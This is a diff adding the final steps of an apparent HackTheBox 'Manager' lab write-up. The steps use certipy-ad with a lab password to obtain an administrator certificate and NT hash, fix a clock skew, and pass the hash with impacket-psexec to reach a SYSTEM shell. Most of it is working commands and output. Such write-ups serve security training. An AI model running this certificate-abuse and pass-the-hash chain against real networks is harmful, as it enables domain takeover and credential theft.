@@ -737,5 +737,94 @@ certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!
 #### Output:
 
 ```
+[*] Successfully issued certificate request ID 19
+```
+
+#### Retrieve the issued certificate:
 
 ```
+certipy-ad req -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -retrieve 19
+```
+
+#### Output:
+
+```
+[*] Retrieving certificate with ID 19
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'administrator@manager.htb'
+[*] Certificate has no object SID
+[*] Loaded private key from '19.key'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+#### Authenticate using the certificate:
+
+```
+certipy-ad auth -dc-ip 10.129.116.131 -pfx administrator.pfx
+```
+
+#### Output:
+
+```
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@manager.htb'
+[*] Using principal: 'administrator@manager.htb'
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+[-] Use -debug to print a stacktrace
+[-] See the wiki for more information
+```
+
+This indicates a clock skew occured, so we can quickly clear that up with the following command:
+
+```
+ntpdate 10.129.116.131
+```
+
+And try again:
+
+#### Authenticate using the certificate:
+
+```
+certipy-ad auth -dc-ip 10.129.116.131 -pfx administrator.pfx
+```
+
+#### Output:
+
+```
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@manager.htb'
+[*] Using principal: 'administrator@manager.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+```
+
+#### Log in using NT hash:
+
+```
+impacket-psexec manager.htb/administrator@10.129.116.131 -hashes ae5064c2f62317332c88629e025924ef:ae5064c2f62317332c88629e025924ef
+```
+
+#### Output:
+
+```
+[*] Requesting shares on 10.129.116.131.....
+[*] Found writable share ADMIN$
+[*] Uploading file nQTtHZxu.exe
+[*] Opening SVCManager on 10.129.116.131.....
+[*] Creating service lrqD on 10.129.116.131.....
+[*] Starting service lrqD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.4974]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami 
+nt authority\system
+```
+
+And that is the end of this machine!
